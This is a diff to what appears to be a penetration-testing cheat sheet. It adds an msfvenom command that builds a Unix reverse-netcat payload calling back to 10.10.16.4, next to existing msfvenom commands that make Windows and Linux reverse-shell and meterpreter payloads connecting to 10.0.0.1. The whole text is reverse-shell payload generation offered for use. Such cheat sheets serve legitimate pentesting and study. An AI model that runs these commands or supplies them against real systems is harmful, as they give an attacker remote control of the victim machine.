@@ -1047,6 +1047,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=443  EXITFUNC=t
 
 ### Linux
 ```
+msfvenom -p cmd/unix/reverse_netcat LHOST=10.10.16.4 LPORT=443 -f python
 msfvenom -p linux/x64/shell_reverse_tcp RHOST=10.0.0.1 LPORT=4444 -f elf > shell.elf
 msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o reverse.elf
 ```
